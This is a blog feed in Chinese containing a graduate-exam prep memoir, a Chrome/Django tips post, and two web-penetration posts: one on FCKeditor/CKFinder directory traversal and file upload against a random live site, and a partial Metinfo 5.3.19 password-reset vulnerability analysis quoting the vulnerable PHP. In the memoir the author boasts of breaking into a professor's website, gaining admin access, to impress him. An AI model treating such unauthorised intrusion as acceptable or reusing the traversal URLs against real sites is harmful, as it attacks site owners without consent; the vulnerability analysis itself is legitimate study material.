href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h2><p>第一阶段，这一阶段一直持续到暑假开学，大概6月中-9月初。这一阶段很重要，是打基础的关键时期，因为是科班，所以专业课我并没有急着复习，这段时间都给了数学英语(数学是大头)。一般早上6点20左右起，40吃饭去教室，7点左右到教室，背英语单词，1个list，背书之后默写几遍，记得每个list最开始是所有词汇的汇总，可以看这个，心里想对应中文意思，不熟的做标记。这里也有技巧，最好每次用不同标记，过第一遍的时候不熟的记△，过第二遍还不熟记□，第三遍还不熟记★，要是再不熟的单词，数量也不多了，可以拿出来专门强化记忆了。还有记单词不能光记单词，下面的例句什么的也要看看，就当练语法了，还可以学习下句式。有些list后面有些名人名言，可以积累起来，写作文的时候用上就是亮点啊。记单词大概能持续到8点吧。然后就是数学时间。复习数学，我的复习顺序是先复习高数，高数复习完再复习线代，最后复习的概率论。高数先是按部就班看课本，做课后习题，记得多做笔记，别整天水群，也别被别人节奏打乱，按照自己的计划来。其实这次感觉自己刷题并不多，只做了课后题，真题和660中的部分题目，感觉还是做的太少，最后考试结果也证实了这点。所以，有时间，有能力，还是要多做题，切忌眼高手低，各种题目见得多了，理解的也就全面到位了，考场上也就能游刃有余。高数部分，我并没有看视频，只跟课本，这个根据自己情况来，感觉基础好，建议直接看课本，基础差，可以边跟视频边看课本，我是考了一年多少有点基础，所以为了省时间，就直接看课本了。高数结束，就开始线代和概率，这部分内容容易点，可以一边看视频一遍看课本相应部分，视频直接李永乐王世安，资源相信各位都能找到，b站，百度云，多动手就有了。复习数学基本上可以持续到晚上9点半教室关门，如果看数学太单调，中间也可以穿插一下英语，灵活安排即可。总体上这段时间数学的时间安排大概高数:线代概率=2:1左右，英语每天一两个小时，每天上午背单词，也可以在下午或者晚上安排一段时间做几篇阅读来培养手感。这一阶段用到的资料有李范全书，李永乐线代讲义，王世安概率讲义，历年高数真题，李永乐660题，英语历年真题(好像30年吧，张剑的太贵了，直接淘宝买的那种牛皮纸袋装的，平时练阅读直接用真题感觉就行了，也可以配合其他模拟题，但是真题一定记得留下最近5、6年的模拟用，数学也是)。这个过程结束，基本就9月份开学了。</p><h2 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h2><p>然后开始第二阶段，这一段时间9月初到10月末，主要用来复习专业课(针对跨考后面有建议)。我的具体时间安排大概是这样的，基本作息上午，铁打不动的英语背单词时间(这段时间应该已经过了两三遍词汇了，速度可以略有提升)然后上午数学，下午专业课，数学复习以做真题加总结为主，专业课王道408课本，感觉知识点基本上都覆盖到了，然后再加上组成中对应的介绍中断的章节（如果考的是408，4本都看就行了，如果专业课是这四门中某几门，那根据具体情况看相应课本即可），所以建议四本书都买，没用过其他专业课复习资料，关于其他资料如何，暂不评论。题目的话除了课后题就是408真题和软微历年真题回忆版，自己王道出的模拟题(感觉质量还可以)，那本王道模拟题有题目还有知识点总结，感觉特别棒，特别适合后期串联知识点！强烈建议购买(没收广告费啊)！三门专业课的时间，基本平摊，这个看自身情况，合理安排即可。晚上一般是英语+专业课，做题+总结。数学题目做得差不多了，可以做一下模拟卷，张宇8套卷4套卷，难得不要不要的，劝退效果显著，我好像没做完过，总结一下即可，没必要太在意，模拟成绩，推荐李永乐6+2，难度较小，利于提升信心，难度也和真题接近。鉴于这两年李林的表现，推荐有时间的可以做做他考前出的模拟题，说不定就碰上原题了呢😂在这期间没动过政治。</p><h2 id="第三阶段"><a href="#第三阶段" class="headerlink" title="第三阶段"></a>第三阶段</h2><p>最后第三阶段，11月初到考前，主要是数学专业课各科总结模拟冲刺+政治英语突击。数学建议过一遍课本巩固知识点，以防遗忘。专业课知识点更多，更不能放松。也要多过几遍，做好题目笔记。政治肖秀荣1000题刷起来，多刷几遍，和你考驾照做科一一样，形成傻瓜式映射即可。感觉1000题覆盖面够了，那本厚的精讲精练我这次没看也没买(上次买了但是也没看完，感觉太多了，看完太浪费时间，投入产出比不高)，其实做一遍1000题的过程就是一次完整的复习过程，我第一遍做的时候，把答案写在一个本子上，然后对照答案，标记一下错误的。这样在做了大概两三遍之后，知识点基本都熟悉了，正确率也上来了，然后就可以着重去复习错误率高的题目了。要是从头到尾复习精讲精练的话，会有很多没用的内容，还不如直接从考点入手。记得肖八肖四一上市就买，多做几遍，只做选择题。然后进入12月份后，每天早上背肖八肖四大题和错误率高的选择题，必须滚瓜烂熟，每天早上背王江涛的考研英语高分写作中的必背范文，积累其中优秀的词汇表达、句式和文章结构，不能死记硬背，最好是同样的话题，可以形成自己的语言，主要是用这个来熟悉发现作文的出题方向和思路。这期间每一门的时间要分配合理，千万不要感觉自己这门学得好就不复习，在那种高强度高压的复习环境中，可能三四天不看这一门，期中的知识点就忘记好多，等到后期时间更紧迫，压力更大，再想拾起来，就费劲了。所以各科一定要雨露均沾！可以有所侧重，但绝不能拆东墙补西墙！要形成自己的体系。针对跨考，建议专业课复习提前，可以暑假阶段就开始，可以白天数学晚上专业课，合理安排复习时间。然后最好是有能证明自己计算机技能的东西，包括编程比赛，计算机相关项目，证书，论文等等，别一穷二白，导师还是喜欢有基础的能干活的同学。</p><h2 id="关于复试"><a href="#关于复试" class="headerlink" title="关于复试"></a>关于复试</h2><h3 id="复试过程"><a href="#复试过程" class="headerlink" title="复试过程"></a>复试过程</h3><p>考完之后，适当休息，接下来要好好准备复试复试了。软微复试还是挺简单的，复试时考场门口有一张本日参加复试的同学名单，名单基本上前一半同学上午，后一半下午，首先参加上午（or下午）复试的所有同学进考场进行10分钟的手写代码测试，然后一个一个进行单独面试。可能是照顾跨考吧，没机试，只有短短十五分钟面试，这次临时加的手写代码环节，让不少同学措手不及啊，三道题目三选一，都很基础，一般都能暴力，第一题貌似最简单，用c/c＋＋/java任意一门语言10分钟写出其主要代码即可。我写了第一道，第二道第三道把自己的思路和想法也写上了。进门复试，一共五位老师，首先英语自我介绍，或者导师用英语提问题(这个可以看各个群里或者下面分享的资料)，我复试前一周结合模板准备一篇自我介绍，一页纸正反面写满了，复试前熟悉了几遍，进去后自我介绍完一般是导师会用英语提问几个问题，可能是我的自我介绍太长😂或者我口语太好？？？介绍完，导师直接说了一声”Good!”就直接下一环节了😂据其他同学反映，英语问题单范围挺广，关于学生自己、家庭家乡、北大、实习以及专业课的很多知识等都有涉及。下面就是考察你专业知识了。一般会有一两位老师先是根据你的手写代码有针对性的问问你的思路什么的，解释一下代码优缺点等等，然后根据你的综述或者简历进行提问，包括问一些专业名词，解释一些专业知识，或者让你介绍你的项目等等。所以这里强烈联系复试时准备几份简历(五份左右)内容不用太多，突出自己的能力，写写自己做的项目(最好计算机相关)，这样也便于掌控一下复试的方向，让导师尽可能问自己有准备的问题，比如这次我就谈了一下简历上写的做过的一个身份识别软件和CTF比赛相关的东西，最后，有位老师还可能会问你一个智力题，什么烧绳子，跑楼梯，倒水，站队等等，思路开阔就行，不必拘泥准确答案。总之，复试是一个让你给导师展现自己能力的机会，要尽可能展现自己的长处和优点，整个过程要积极主动，让导师记住自己！千万别拘谨被动，被牵着鼻子走……反正我复试完，有种意犹未尽的感觉，有好多东西都还没来得及展示(吹)，就有说有笑的结束了，全程感觉很放松，最后也得到了不错的成绩(87分，让我排名提升了40名，从初试115直接到总排74)。整个过程，大概就是这样吧～</p><h3 id="复试机试准备建议"><a href="#复试机试准备建议" class="headerlink" title="复试机试准备建议"></a>复试机试准备建议</h3><p>其实这次复试，自己准备的也挺匆忙的，大概过程就是先过了一遍408王道单科书课本(数据结构，网络，操作系统以及组成中关于中断的部分)，对专业课基本知识又复习了一遍。然后一开始并不知道有没有机试，就准备了机试，看的是王道的机试指南和刘汝佳的算法竞赛入门经典第二版(其实没怎么看这本因为复试通知没有机试)，对基本算法又复习了一遍。复试通知告知没有机试，让我一度复习得很放松，但是复试第一天上午突然传出要手写代码，而我在第一天下午复试，针对上午的题目稍微做了一下准备，而下午遇到的题目也基本证实还都算是跨考友好型题目吧(三选一，挑最简单的暴力一下就可以了)，总结一下代码考察的重点，kmp，递归，动态规划，贪心等。而这次手写代码的形式，感觉在全国范围内可能是首次出现吧，所以会不会延续这种模式并不确定。毕竟计算机专业对动手能力要求高，还是提前准备一下为好，复试复习时可以刷一刷OJ（哪家oj都可以，像poj,leetcode等等，能起到训练效果就好），保持手感，以不变应万变。</p><h2 id="关于联系导师"><a href="#关于联系导师" class="headerlink" title="关于联系导师"></a>关于联系导师</h2><p>我感觉复试前联系导师还是有用的，尽管很多人鼓吹无用论以及当前规定也不允许复试前考生见导师，这就使得如何联系导师具有一定的”技巧性”。在我查到成绩之前，自己写了一封自荐信模板，以及准备了简历模，模板的大部分内容是一样的，只替换相应称呼以及最下面对导师研究方向的兴趣就可以。我从官网筛选出四位研究方向我感兴趣并且学术能力强(身上title多，发的论文多并且仍在发，可以看论文发表时间自行判断)的教授。成绩出来第二天，其实是很忐忑的，因为今年太炸了，而我总排230+，867技术类排名115-120，技术类招收名额并不确定，就知道总人数收270。而心中有疑问，不正是联系导师就可以解决的嘛😀所以就把邮件附上个人简历分别发给了四位老师，这里有个小技巧，就是发邮件时选择回执功能，QQ邮箱是有这个功能的，这样导师打开邮件，你这边会收到提示信息，这样但是看没看邮件就心里有数了。然后就是等待啊，最后只有一位导师回复了我，还是研究我最喜欢的方向的那位导师，说欢迎我报考他的研究生并说在复试时会关注我。我很激动，起码感觉能进复试了，但是还是有好多疑问，这时候就要进一步联系了，那就是去当面拜访导师。要当面拜访最好是有个合适的理由或者引子。比如对导师研究方向感兴趣，而最近正在搞一个什么相关问题，并且有了新的成果发展，想当面交流一下。一定要突出自己的学术能力或者技术能力，让导师感觉你这个人值得见，如果啥都没有但是分数够理想也可以谈谈自己对但是这个方向的理解自己自己的打算和近期的努力情况。如果亲自面见感觉困难(如距离学校路途遥远)，也可以电话邮件联系，但是一定要让导师看到自己的价值，不然你这可就是”骚扰”了……而我的经历可能听起来有点炫酷😂因为我选的安全方向，学的也是这个，然后我就把这个导师的网站给”日”了（渗透了一遍，拿到了admin权限，虽然最后导师说是网站域名过期了，现在域名并不是他们在维护了，但这个过程一样刺激不是吗？），然后记录了一下整个过程并且提出了修复建议，然后通过邮件发给了导师，并且在邮件中说希望有机会能亲自拜访一下导师。这次果然很受导师重视，回复的内容也更多了，并且加了我微信，约了时间见了面。见面后谈了很多，发现导师的方向正视自己喜欢的方向！聊了一下关于软微的培养方式等问题，消除了心中很多疑问，也再次坚定了进入复试的信心(其实那个时候导师也不知道具体名额分配情况还有别指望给你透复试题，根本不存在的，复试题目看往年回忆版足够了)，所以联系导师感觉还是必要的。文章最后是资料链接，需要的自取。</p><h2 id="关于复试后的一些建议"><a href="#关于复试后的一些建议" class="headerlink" title="关于复试后的一些建议"></a>关于复试后的一些建议</h2><p>因为我这次是二战，初试结束后就立刻投了简历，找了个实习，来到了梦寐以求的公司，身边一个个都是大佬，我快菜死了😭鸭梨大。。。如果你也是二战的，复试过后也别闲着，可以找个工作干着，一方面赚点学费，另一方面学点技术，这些也都可以成为你复试的谈资～如果是应届生，也可以找个实习或者专心搞毕设(我司就有好多大三大四的实习生，而我是如此菜:-()。实习可以提前一段时间找，但是工作时间肯定会占用复试复习时间，这个要自己拿捏好规划好。我是年后初七开班就来公司报道了，平时复习时间就在每天早上晚上和周末(这是我的安排，我感觉够用了，因人而异，这个看自身情况合理安排就好了，不要学我啊🤓因为好多公司加班挺严重的，平时可能根本就没有时间就给你复习哦～所以如果是求稳，那就好好准备复试吧～)。如果拿到拟录取通知，可能的话也可以提前联系导师去搬砖啊。这些都是很好的选择。当然，奋斗了这么久，早已是身心疲惫，出去看看祖国的壮丽山河放松一下感觉也是棒棒的啊！（立下flag：实习结束我要去浪！！！！）总之别让自己闲着就好啦~</p><h1 id="福利"><a href="#福利" class="headerlink" title="福利"></a>福利</h1><p>最后这里是初试以及复试的一些资料，赠人玫瑰，手有余香～祝大家都能考上理想的学校，加油！！！<br>408专业课及北大计算机考研资料：<a href="https://pan.baidu.com/s/16VUvAmZbUa__sdw3FfmI_A" target="_blank" rel="noopener">提取码:cc8i</a><br>北大软微历年考研数据分析以及复试资料：<a href="https://pan.baidu.com/s/1890TUFySa38iAzwO0981xQ" target="_blank" rel="noopener">提取码:y0ep</a></p><p>若链接失效，请及时与<a href="http://rookiehacker.org:8888/images/2019/03/30/8b120b04f44ceb7426f3a0a46349f862.jpg" target="_blank" rel="noopener">本人</a>联系，谢谢！<br>建了个<a href="http://rookiehacker.org:8888/images/2019/03/30/2d5b73d2f9f21216428c749d69a6ebae.jpg" target="_blank" rel="noopener">答疑群</a>，一个个回答太累~<br><img src="http://rookiehacker.org:8888/images/2019/03/30/2d5b73d2f9f21216428c749d69a6ebae.jpg" alt="欢迎进群，一起奋斗！"></p><hr><blockquote><p><em>声明：</em><br>文章标题：<a href="http://blog.rookiehacker.org/2019/03/30/fightforpku/" title="【考研之路】回首漫漫考研路">【考研之路】回首漫漫考研路</a><br>文章作者：<a href="http://blog.rookiehacker.org/about/">RookieHacker</a><br>文章链接：<a href="http://blog.rookiehacker.org/2019/03/30/fightforpku/" title="【考研之路】回首漫漫考研路">http://blog.rookiehacker.org/2019/03/30/fightforpku/</a><br>文章版权属本博主所有，有问题或者建议欢迎在下方评论。欢迎转载、引用，但请标明作者和原文地址，谢谢。</p></blockquote><hr><p><em>喜欢，就支持我一下吧~</em></p><hr><p><iframe src="http://blog.rookiehacker.org/donate-page/simple/" style="overflow-x:hidden;overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe></p><hr>]]></content>
    
    <summary type="html">
    
      两年考研路，今日终上岸，分享一下自己的故事，希望能为你梦想的夜空点缀些许星光~
    
    </summary>
    
      <category term="生活" scheme="http://blog.rookiehacker.org/categories/%E7%94%9F%E6%B4%BB/"/>
    
    
      <category term="考研" scheme="http://blog.rookiehacker.org/tags/%E8%80%83%E7%A0%94/"/>
    
  </entry>
  
  <entry>
    <title>【Web渗透】FCKeditor和CKeditor插件漏洞利用</title>
    <link href="http://blog.rookiehacker.org/2019/03/19/fckeditorandckeditor/"/>
    <id>http://blog.rookiehacker.org/2019/03/19/fckeditorandckeditor/</id>
    <published>2019-03-19T15:20:36.000Z</published>
    <updated>2019-03-29T17:53:13.463Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><p>某日闲着无聊，随便百度了个关键词，随便找了家网站，开始渗透。<br>查看网站指纹信息，发现网站使用aspx语言，运行在Windows服务器上。<br><img src="http://rookiehacker.org:8888/images/2019/03/30/52cb499fc555a0bbea814ddc1d361bdc.png" alt=""><br>接下来实用工具扫描目录，得到存在以下目录。<br><code>http://www.xxxxxx.com/admin/FCKeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=D:\web\xxxxxxx\wwwroot\</code><br>可知使用了FCKeditor，并且导致了目录遍历，网站所在服务器目录信息能够被非法遍历。<br>进一步分析目录信息，在admin文件夹下发现了FCKeditor和ckeditor两个文件。接下来寻找文件上传点。<br>首先分析FCKeditor。在<br><code>http://www.xxxxxxx.com/admin/FCKeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=D:\web\xxxxxxx\wwwroot\ADMIN\fckeditor\editor</code><br>下发现FCKeditor.html<br><img src="http://rookiehacker.org:8888/images/2019/03/30/6b276e422a14680cdd8326d6a984efde.png" alt=""><br>访问后发现不能打开，此上传点无法利用。接下来检查ckeditor。在<br><code>http://www.xxxxxxx.com/admin/FCKeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=File&amp;CurrentFolder=D:\web\xxxxxxx\wwwroot\ADMIN\ckeditor\ckfinder</code><br>下发现CKFinder.html,并且可以正常访问。可以发现站点使用的是CKFinder2，并且可以非法上传、删除、编辑网站文件。<br><img src="http://rookiehacker.org:8888/images/2019/03/30/00e8a9afcf318f0fada1dd2da3dd7b04.png" alt=""><br>这里是使用了相同编辑器的另外一个网站的被入侵的情况，有点惨不忍睹。<br><img src="http://rookiehacker.org:8888/images/2019/03/30/a0066f397293a15081065f383cb5de98.png" alt=""></p><h2 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h2><p>删除不必要的测试文件，及时升级插件版本。</p><hr><blockquote><p><em>声明：</em><br>文章标题：<a href="http://blog.rookiehacker.org/2019/03/19/fckeditorandckeditor/" title="【Web渗透】FCKeditor和CKeditor插件漏洞利用">【Web渗透】FCKeditor和CKeditor插件漏洞利用</a><br>文章作者：<a href="http://blog.rookiehacker.org/about/">RookieHacker</a><br>文章链接：<a href="http://blog.rookiehacker.org/2019/03/19/fckeditorandckeditor/" title="【Web渗透】FCKeditor和CKeditor插件漏洞利用">http://blog.rookiehacker.org/2019/03/19/fckeditorandckeditor/</a><br>文章版权属本博主所有，有问题或者建议欢迎在下方评论。欢迎转载、引用，但请标明作者和原文地址，谢谢。</p></blockquote><hr><p><em>喜欢，就支持我一下吧~</em></p><hr><p><iframe src="http://blog.rookiehacker.org/donate-page/simple/" style="overflow-x:hidden;overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe></p><hr>]]></content>
    
    <summary type="html">
    
      一次针对FCKeditor和CKeditor插件文件目录遍历和文件上传漏洞的渗透测试。
    
    </summary>
    
      <category term="Web渗透" scheme="http://blog.rookiehacker.org/categories/Web%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="web" scheme="http://blog.rookiehacker.org/tags/web/"/>
    
      <category term="渗透" scheme="http://blog.rookiehacker.org/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>【Tips】Chrome更新后cookie的设置&amp;Django过滤器filter中的参数详解</title>
    <link href="http://blog.rookiehacker.org/2019/03/04/chromecookie/"/>
    <id>http://blog.rookiehacker.org/2019/03/04/chromecookie/</id>
    <published>2019-03-04T14:35:32.000Z</published>
    <updated>2019-03-04T15:00:36.889Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>前几日在使用postman测试整理产品的API接口的时候，自动更新了chrome，由于要验证登录身份，需要设置token和cookie值。但是在chrome更新之后，再次打开开发者工具在network里查看header信息，却没发现cookie信息，一脸懵逼。摸索了半天，发现应该是为了安全起见，chrome默认将cookie等敏感信息设置为了不可见。所以需要手动打开，设置-内容设置-cookie-打开允许网站保存和读取cookie数据-重启chrome即可，。</p><p>由于项目功能升级，需要对登录用户的角色进行区分，不同用户的功能是不同的，所以要对后台展示的信息进行过滤处理，Django提供了filter函数，来对数据库的信息进行过滤，使用起来很方便，但是其中有很多值得注意的地方啊，第一次在项目中使用，被参数问题整得头大。下面寄一个小笔记：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Django 过滤器filter中的参数详解</span><br><span class="line"></span><br><span class="line">__exact 精确等于 like &apos;aaa&apos;</span><br><span class="line"> __iexact 精确等于 忽略大小写 ilike &apos;aaa&apos;</span><br><span class="line"> __contains 包含 like &apos;%aaa%&apos;</span><br><span class="line"> __icontains 包含 忽略大小写 ilike &apos;%aaa%&apos;，但是对于sqlite来说，contains的作用效果等同于icontains。</span><br><span class="line">__gt 大于</span><br><span class="line">__gte 大于等于</span><br><span class="line">__lt 小于</span><br><span class="line">__lte 小于等于</span><br><span class="line">__in 存在于一个list范围内</span><br><span class="line">__startswith 以...开头</span><br><span class="line">__istartswith 以...开头 忽略大小写</span><br><span class="line">__endswith 以...结尾</span><br><span class="line">__iendswith 以...结尾，忽略大小写</span><br><span class="line">__range 在...范围内</span><br><span class="line">__year 日期字段的年份</span><br><span class="line">__month 日期字段的月份</span><br><span class="line">__day 日期字段的日</span><br><span class="line">__isnull=True/False</span><br><span class="line"></span><br><span class="line">也就是说，models中定义的各种属性的名字后面加上上面这些后缀，可以起到进一步的过滤作用</span><br></pre></td></tr></table></figure><hr><blockquote><p><em>声明：</em><br>文章标题：<a href="http://blog.rookiehacker.org/2019/03/04/chromecookie/" title="【Tips】Chrome更新后cookie的设置&Django过滤器filter中的参数详解">【Tips】Chrome更新后cookie的设置&Django过滤器filter中的参数详解</a><br>文章作者：<a href="http://blog.rookiehacker.org/about/">RookieHacker</a><br>文章链接：<a href="http://blog.rookiehacker.org/2019/03/04/chromecookie/" title="【Tips】Chrome更新后cookie的设置&Django过滤器filter中的参数详解">http://blog.rookiehacker.org/2019/03/04/chromecookie/</a><br>文章版权属本博主所有，有问题或者建议欢迎在下方评论。欢迎转载、引用，但请标明作者和原文地址，谢谢。</p></blockquote><hr><p><em>喜欢，就支持我一下吧~</em></p><hr><p><iframe src="http://blog.rookiehacker.org/donate-page/simple/" style="overflow-x:hidden;overflow-y:hidden; border:0xp none #fff; min-height:240px; width:100%;" frameborder="0" scrolling="no"></iframe></p><hr>]]></content>
    
    <summary type="html">
    
      关于chrome更新后无法查看cookie的一些小tips
    
    </summary>
    
      <category term="Python" scheme="http://blog.rookiehacker.org/categories/Python/"/>
    
    
      <category term="Python" scheme="http://blog.rookiehacker.org/tags/Python/"/>
    
      <category term="Django" scheme="http://blog.rookiehacker.org/tags/Django/"/>
    
      <category term="Chrome" scheme="http://blog.rookiehacker.org/tags/Chrome/"/>
    
      <category term="cookie" scheme="http://blog.rookiehacker.org/tags/cookie/"/>
    
  </entry>
  
  <entry>
    <title>【Web渗透】Metinfo 5.3.19 管理员密码重置漏洞分析</title>
    <link href="http://blog.rookiehacker.org/2019/02/22/metinfotest/"/>
    <id>http://blog.rookiehacker.org/2019/02/22/metinfotest/</id>
    <published>2019-02-22T12:01:40.000Z</published>
    <updated>2019-02-23T03:55:55.645Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一个偶然的原因，看到了一个站点，进去后发现有明显的被黑的痕迹，查看整个站点发现采用的是Metinfo 5.3.19 CMS,google一下，发现关于这个版本的CMS有管理员密码重置的漏洞，网上已经有几篇文章来描述这个问题了，这里也顺便参考这自己分析一遍，整理一下整个漏洞的来龙去脉。<br><img src="http://rookiehacker.org:8888/images/2019/02/22/b38039f6dbdd9ee2b1cb378ac36f26a2.png" alt="Metinfo 5.3.19"></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在官网上有5.3.19版本下载，下载后发现整个站点的code都拿到手了，看到问题出现在连接 <code>admin/admin/getpassword.php</code>这里，打开这个文件，在第四行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">require_once &apos;../include/common.inc.php&apos;;</span><br></pre></td></tr></table></figure></p><p>这里直接包含了<code>include/common.inc.php</code>，打开，找到其中关于<code>post</code>的代码，</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">foreach(array(&apos;_COOKIE&apos;, &apos;_POST&apos;, &apos;_GET&apos;) as $_request) &#123;</span><br><span class="line">foreach($$_request as $_key =&gt; $_value) &#123;</span><br><span class="line">$_key&#123;0&#125; != &apos;_&apos; &amp;&amp; $$_key = daddslashes($_value,0,0,1);</span><br><span class="line">$_M[&apos;form&apos;][$_key]=daddslashes($_value,0,0,1);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里存在变量覆盖漏洞，<br>然后在<code>admin/admin/getpassword.php</code>中查找关于关于重置密码的处理过程<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">$admin_list = $db-&gt;get_one(&quot;SELECT * FROM $met_admin_table WHERE admin_id=&apos;$admin_mobile&apos; and usertype=&apos;3&apos;&quot;);</span><br><span class="line">if($admin_list &amp;&amp; $admin_list[&apos;admin_email&apos;]==&apos;&apos;)okinfo(&apos;../admin/getpassword.php&apos;,$lang_password14);</span><br><span class="line">if(!$admin_list)&#123;</span><br><span class="line">if(!is_email($admin_mobile))okinfo(&apos;../admin/getpassword.php&apos;,$lang_password7);</span><br><span class="line">$admin_list = $db-&gt;get_one(&quot;SELECT * FROM $met_admin_table WHERE admin_email=&apos;$admin_mobile&apos; and usertype=&apos;3&apos;&quot;);</span><br><span class="line">if(!$admin_list)okinfo(&apos;../admin/getpassword.php&apos;,$lang_password14);</span><br><span class="line">&#125;</span><br><span class="line">if($admin_list)&#123;</span><br><span class="line">$met_fd_usename=$met_fd_usename;</span><br><span class="line">$met_fd_fromname=$met_fd_fromname;</span><br><span class="line">$met_fd_password=$met_fd_password;</span><br><span class="line">$met_fd_smtp=$met_fd_smtp;</span><br><span class="line">$met_webname=$met_webname;</span><br><span class="line">$met_weburl=$met_weburl;</span><br><span class="line">$adminfile=$url_array[count($url_array)-2];</span><br><span class="line">$from=$met_fd_usename;</span><br><span class="line">$fromname=$met_fd_fromname;</span><br><span class="line">$to=$admin_list[&apos;admin_email&apos;];</span><br><span class="line">$usename=$met_fd_usename;</span><br><span class="line">$usepassword=$met_fd_password;</span><br><span class="line">$smtp=$met_fd_smtp;</span><br><span class="line">$title=$met_webname.$lang_getNotice;</span><br><span class="line">$x = md5($admin_list[admin_id].&apos;+&apos;.$admin_list[admin_pass]);</span><br><span class="line">$outime=3600*24*3;</span><br><span class="line">$String=authcode($admin_list[admin_id].&quot;.&quot;.$x,&apos;ENCODE&apos;, $met_webkeys, $outime);</span><br><span class="line">$String=urlencode($String);</span><br><span class="line">$mailurl= $met_weburl.$adminfile.&apos;/admin/getpassword.php?p=&apos;.$String;</span><br><span class="line">$body =&quot;&lt;style type=&apos;text/css&apos;&gt;\n&quot;;</span><br><span class="line">$body .=&quot;#metinfo&#123; padding:10px; color:#555; font-size:12px; line-height:1.8;&#125;\n&quot;;</span><br><span class="line">$body .=&quot;#metinfo .logo&#123; border-bottom:1px dotted #333; padding-bottom:5px;&#125;\n&quot;;</span><br><span class="line">$body .=&quot;#metinfo .logo img&#123; border:none;&#125;\n&quot;;</span><br><span class="line">$body .=&quot;#metinfo .logo a&#123; display:block;&#125;\n&quot;;</span><br><span class="line">$body .=&quot;#metinfo .text&#123; border-bottom:1px dotted #333; padding:5px 0px;&#125;\n&quot;;</span><br><span class="line">$body .=&quot;#metinfo .text p&#123; margin-bottom:5px;&#125;\n&quot;;</span><br><span class="line">$body .=&quot;#metinfo .text a&#123; color:#70940E;&#125;\n&quot;;</span><br><span class="line">$body .=&quot;#metinfo .copy&#123; color:#BBB; padding:5px 0px;&#125;\n&quot;;</span><br><span class="line">$body .=&quot;#metinfo .copy a&#123; color:#BBB; text-decoration:none; &#125;\n&quot;;</span><br><span class="line">$body .=&quot;#metinfo .copy a:hover&#123; text-decoration:underline; &#125;\n&quot;;</span><br><span class="line">$body .=&quot;#metinfo .copy b&#123; font-weight:normal; &#125;\n&quot;;</span><br><span class="line">$body .=&quot;&lt;/style&gt;\n&quot;;</span><br><span class="line">$body .=&quot;&lt;div id=&apos;metinfo&apos;&gt;\n&quot;;</span><br><span class="line">if($met_agents_type&lt;=1)&#123;</span><br><span class="line">$body .=&quot;&lt;div class=&apos;logo&apos;&gt;&lt;a href=&apos;$met_weburl&apos; title=&apos;$met_webname&apos;&gt;&lt;img 